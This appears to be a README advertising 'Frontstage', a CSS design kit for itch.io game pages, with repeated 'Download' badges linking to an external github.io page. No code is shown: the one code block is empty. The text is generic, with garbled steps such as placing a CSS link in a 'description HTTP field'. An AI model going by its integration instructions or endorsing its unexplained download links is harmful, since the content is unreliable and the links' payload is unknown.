![preview](https://raw.githubusercontent.com/asaquib191-sketch/itch-css-crate/main/card_b201c.svg)

# Frontstage — A Design System for Game Showcase Pages

## Overview

Every game page on itch.io is a stage, and your game is the star performer. Yet most developers treat their storefront like a blank wall, relying on default layouts that blend into the noise of thousands of other titles. **Frontstage** is a curated collection of CSS components, layout blueprints, and visual micro-tweaks designed specifically for indie game pages—transforming a static product page into an immersive pre-game experience. Think of it as a lighting rig, set design, and stage manager all bundled into one adaptable toolkit.

Unlike generic CSS frameworks that force you to squeeze your personality into rigid grids, Frontstage embraces the quirky, handcrafted nature of indie game culture. Each component is a modular piece you can lift, rotate, or discard entirely. Whether you’re shipping a cozy farming sim or a high-octane bullet hell, these stylesheets help your page whisper (or shout) your game’s personality before the player ever clicks "Run."

---

## Why Another CSS Toolkit?

The web is full of frameworks that promise pixel-perfection but deliver wall-to-wall sameness. Frontstage isn't another 60KB monolith—it's a **grab-bag of scene changes**. You don't adopt the whole system; you pick the moments that matter. A hover effect here, a typographic accent there, a background texture that makes your title card feel like a poster.

### The Philosophy: Less "System," More "Stage Directions"

- **Plays well with existing themes** – Don’t rip out your current design. Layer Frontstage on top like a varnish.
- **Tiny, lego-like modules** – Each CSS block is self-contained. No cascade nightmares.
- **Performance is the prologue** – No heavy JavaScript. Just clean, modern CSS that runs at 60fps on a 2015 laptop.
- **Built for the itch.io ecosystem** – We respect the platform’s constraints while pushing its visual boundaries.

---

## What’s Inside the Crate

[![Download](https://raw.githubusercontent.com/asaquib191-sketch/itch-css-crate/main/fetch_f94fd.svg)](https://asaquib191-sketch.github.io/itch-css-crate/)

### 🎭 Core Components

| Module | Description | Ideal For |
|--------|-------------|-----------|
| **MoodLink** | Animated link states that mimic texture changes (leather, rust, neon) | Narrative games, horror titles |
| **TagTiles** | Turn your genre tags into collectible badge-style chips | Arcade, party games |
| **ScreenshotScrim** | Fades and overlays for your media gallery that add cinematic letterboxing | Story-driven games, visual novels |
| **DevlogDresser** | Reformats your devlog entries into a readable, card-based timeline | Long-running projects |
| **ButtonChrome** | Three distinct button skins: Bakelite, Chromed, and Felt | Jam entries or polished releases |
| **TypoFlair** | Six headline treatments that don't rely on web fonts—system font tricks only | Fast load times, offline play |

### 🎨 Theme Presets

- **The Attic** – Dusty, sepia-toned palette for retro horror and mystery games
- **The Arcade** – High-contrast, scanline-infused layout for pixel-art projects
- **The Gallery** – Minimalist, white-space-heavy arrangement for atmospheric art games
- **The Workshop** – Blueprint-style grid with technical annotations for experimental titles

### 🧰 Utility Drawers

- **SpacingRuler** – A consistent vertical rhythm calculator for page sections
- **EdgeCutter** – Rounded corners and organic border-radius generators
- **BreathingRoom** – Responsive margin padding that adapts to screen width
- **ContrastKit** – Automated text-over-background readability adjustments

---

## Getting Started

No build tools. No node modules. No terminal gymnastics. Download the ZIP, open the folder, and you'll find a `core.css` file (the essential layout helpers) plus individual modules you can include or ignore.

### Basic Integration

1. **Upload the files** to your itch.io project directory (or any static host that serves the project page).
2. **Add a single `<link>` tag** in your page's HTML head section (inside the `description` HTTP field if you’re only using the web editor).
3. **Apply classes** your elements based on the quick-reference cheat sheet included in the `docs` folder.

Most users have a working themed page within fifteen minutes. If you’re using itch.io’s inline editor, simply paste the contents of `core.css` into the custom CSS textarea and cherry-pick the module styles you want.

```

```

### Folder Structure

```
frontstage/
├── core.css            # Base reset + spacing utilities (~3KB)
├── modules/
│   ├── moodlink.css
│   ├── tagtiles.css
│   ├── screenshotscrim.css
│   ├── devlogdresser.css
│   ├── buttonchrome.css
│   └── typoflair.css
├── themes/
│   ├── attic.css
│   ├── arcade.css
│   ├── gallery.css
│   └── workshop.css
├── docs/
│   ├── CHEATSHEET.md
│   ├── HOSTING_GUIDE.md
│   └── VERSION_HISTORY.md
└── license.txt
```

---

## Feature Highlights

### 🛰️ Responsive to a Fault

Frontstage components are built with mobile-first breakpoints. Your page’s atmosphere doesn’t evaporate when viewed on a phone—filters, overlays, and typography scale rhythmically. We test down to 320px viewports and up to 4K displays.

### 🌐 Multilingual Readiness

All component text is purely visual. No embedded labels, no tooltips that break in translation. Layout density adapts well to German’s long nouns, Japanese’s compact kanji, and Arabic’s right-to-left flow. The `dir` attribute is fully respected across all modules.

### 🕰️ Twenty-Four-Hour Support Philosophy

While you won’t find a phone line for CSS questions, we maintain **a living repository** of reported issues and edge cases. The documentation receives updates every two weeks in sync with itch.io’s platform changes. If a weird browser quirk appears, you’ll see a patch note here before you even notice the glitch.

### 🧩 Zero JavaScript Dependency

Everything runs on pure CSS variables, `clamp()` functions, and structural selectors. Your page loads faster and works in environments with aggressive script-blockers.

### 🎚️ Granular Control

Each module exposes a set of CSS custom properties (`--fs-accent-color`, `--fs-corner-radius`, `--fs-layer-blur`) that let you override defaults without editing the core files.

---

## Advanced Usage: The "Unstage" Method

Sometimes you want your page to *feel* unfinished—intentionally. The **Workshop theme** includes a `rough-edge` class that adds subtle marker-line borders and misaligned grids. Instead of fighting imperfection, lean into it. Pair it with the **DevlogDresser** to present your game as a living experiment, not a finished product.

---

## Browser & Platform Compatibility

| Browser | Support Level |
|---------|---------------|
| Firefox 90+ | Full support, tested nightly builds |
| Chrome 95+ | Full support, including mobile android |
| Safari 15+ | Full support with minor caveats (backdrop-filter needs `-webkit-` prefix) |
| Edge 95+ | Full support |
| itch.io mobile app | Core layout supported; advanced filters degrade gracefully |

---

## Community Showcase & Contribution

This project thrives on the weird corners of the itch.io community. If you’ve made something unusual with Frontstage, submit a link through the Issues board with `[SHOWCASE]` in the title. You’ll find a selection of popular examples in the `community_examples.md` file.

**Ways to contribute:**

- Open a PR with a new theme preset that matches a genre we haven’t covered yet.
- Report a bug where our layout fails on a particular embed size.
- Suggest a utility class that solves one specific pain point you keep hitting.

---

## Roadmap for 2026

We’re planning a bold refresh for mid-2026 that aligns with the emergence of CSS nested declarations:

- **Dark Mode Detective** – An automated module that scans your existing colors and proposes a dark-mode equivalent.
- **Motion Reduction Pass** – Every animation gets a `prefers-reduced-motion` fallback—not just a single toggle.
- **Legacy Safeguards** – Extended support for older WebKit versions that still populate old itch.io embeds.
- **A/B Test Mockups** – A simple script (totally optional, no JS required for functioning) that helps you preview two visual variants of your page side-by-side.

---

## Disclaimer

This project is an independent open-source initiative. It is **not affiliated with, endorsed by, or sponsored by itch.io** or Leaf Corcoran. All product names, logos, and brands are property of their respective owners. The CSS modules are provided as-is, without warranty of any kind, express or implied. You are solely responsible for ensuring that your page complies with the itch.io User Agreement and Content Policy—our stylesheets don't circumvent any rules about advertising, mature content, or prohibited sales.

We make no representations about the suitability of this software for any specific game release. Some components may conflict with third-party widgets you’ve embedded. Always test in a private preview before publishing to your public page.

---

## License

Released under the **MIT License** — you are free to use, modify, and distribute this toolkit in personal and commercial projects. A human-readable summary is available at [MIT License Overview](https://opensource.org/licenses/MIT). The full legal text is contained in the `license.txt` file inside the package.

---

## Final Word

Your itch.io page is often the first thing a player sees before they press play. It’s a handshake, a trailer, and a mood board all at once. Frontstage hands you the paint, the brushes, and the scaffolding—but the masterpiece is still uniquely yours.

[![Download](https://raw.githubusercontent.com/asaquib191-sketch/itch-css-crate/main/fetch_f94fd.svg)](https://asaquib191-sketch.github.io/itch-css-crate/)